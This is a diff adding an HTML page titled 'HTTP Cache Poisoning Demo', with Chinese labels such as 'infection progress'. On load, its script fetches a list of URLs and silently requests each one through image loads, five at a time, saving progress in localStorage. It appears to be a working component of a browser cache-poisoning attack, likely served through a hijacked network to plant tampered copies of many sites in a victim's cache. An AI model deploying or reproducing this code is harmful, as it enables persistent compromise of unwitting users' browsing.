@@ -1,0 +1,86 @@
+<!doctype html>
+<html>
+<head>
+	<meta charset="utf-8" />
+	<title>HTTP Cache Poisoning Demo</title>
+	<style>
+	</style>
+</head>
+<body>
+	<div>缓存污染中...</div>
+	<div id="uiStat">ready</div>
+	<progress id="uiProg" max="100"></progress>
+	<script>
+		var URL_GET_LIST = '__get_poisoning_list__';
+
+		function readLS(key) {
+			return localStorage[key];
+		}
+		function writeLS(key, val) {
+			localStorage[key] = val;
+		}
+
+		var MAX_THREAD = 5;
+
+		var list;
+		var prog = +readLS('prog') || 0;
+
+		function start(data) {
+			list = data.split('\n');
+			for (var i = 0; i < MAX_THREAD; i++) {
+				if (task()) {
+					break;
+				}
+			}
+
+			// 保存感染进度
+			var lastProg = prog;
+
+			setInterval(function() {
+				if (lastProg != prog) {
+					lastProg = prog;
+					writeLS('prog', prog);
+				}
+			}, 1000);
+		}
+
+		function task() {
+			if (prog >= list.length) {
+				uiStat.innerHTML = 'done';
+				return true;
+			}
+			var url = 'http://' + list[prog++];
+			preload(url, task);
+
+			// display
+			console.info('poisoning %s', url);
+			uiStat.innerHTML = prog + '/' + list.length;
+			uiProg.value = 100 * prog / list.length;
+		}
+
+		function preload(url, callback) {
+			var loader = new Image();
+			loader.onerror = function() {
+				callback(url);
+			};
+			loader.src = url;
+		}
+
+		function loadList() {
+			var xhr = //window.ActiveXObject ?
+				//new ActiveXObject('Microsoft.XMLHTTP') :
+				new XMLHttpRequest();
+
+			xhr.open('GET', URL_GET_LIST, true);
+			xhr.onreadystatechange = function() {
+				if (xhr.readyState == 4) {
+					start(xhr.responseText);
+				}
+			};
+			xhr.send();
+		}
+
+		loadList();
+	</script>
+</body>
+</html>
